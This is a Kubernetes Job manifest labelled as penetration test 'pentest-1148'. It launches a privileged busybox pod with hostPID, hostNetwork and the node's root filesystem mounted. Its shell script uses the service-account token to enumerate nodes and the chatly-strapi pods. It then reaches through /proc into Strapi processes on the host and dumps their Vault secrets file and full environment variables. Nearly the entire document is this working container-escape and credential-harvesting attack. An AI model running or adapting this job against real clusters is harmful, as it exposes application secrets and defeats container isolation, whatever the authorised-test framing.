apiVersion: batch/v1
kind: Job
metadata:
  name: strapi-collect2
  namespace: pentest-1148
  labels:
    purpose: pentest-1148
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 86400
  template:
    metadata:
      labels:
        purpose: pentest-1148
    spec:
      serviceAccountName: probe
      restartPolicy: Never
      hostPID: true
      hostNetwork: true
      nodeSelector:
        app: chatly
      tolerations:
      - key: app
        operator: Equal
        value: chatly
        effect: NoSchedule
      containers:
      - name: c
        image: busybox:1.36
        securityContext:
          privileged: true
        volumeMounts:
        - name: hostroot
          mountPath: /host
        command: ["/bin/sh","-c"]
        args:
        - |
          API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          get() { wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
          echo "##MYHOST"; hostname; cat /host/etc/hostname 2>/dev/null
          echo "##NODES"
          get "$API/api/v1/nodes" | tr ',' '\n' | grep -E '"name"' | sed 's/.*"name": *"//;s/".*//' | sort -u
          echo "##PODS"
          get "$API/api/v1/namespaces/chatly-strapi/pods" > /tmp/pods.json
          tr '{' '\n' < /tmp/pods.json | grep -E '"(name|nodeName|phase)"' | head -60
          echo "##STRAPI_PROCS"
          found=0
          for p in /proc/[0-9]*; do
            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
            case "$cmd" in
              *strapi*|*node*) : ;;
              *) continue ;;
            esac
            [ -f $p/root/vault/secrets/config ] || continue
            found=1
            echo "===== PID ${p#/proc/} CMD=$cmd"
            echo "----- vault/secrets/config -----"
            cat $p/root/vault/secrets/config 2>&1
            echo "----- /proc/PID/environ -----"
            tr '\0' '\n' < $p/environ 2>&1
            echo "----- /app listing -----"
            ls -la $p/root/app 2>&1 | head -40
            break
          done
          [ "$found" = "0" ] && echo "NOSTRAPIPROC_ON_THIS_NODE"
          echo "##END##"
      volumes:
      - name: hostroot
        hostPath:
          path: /
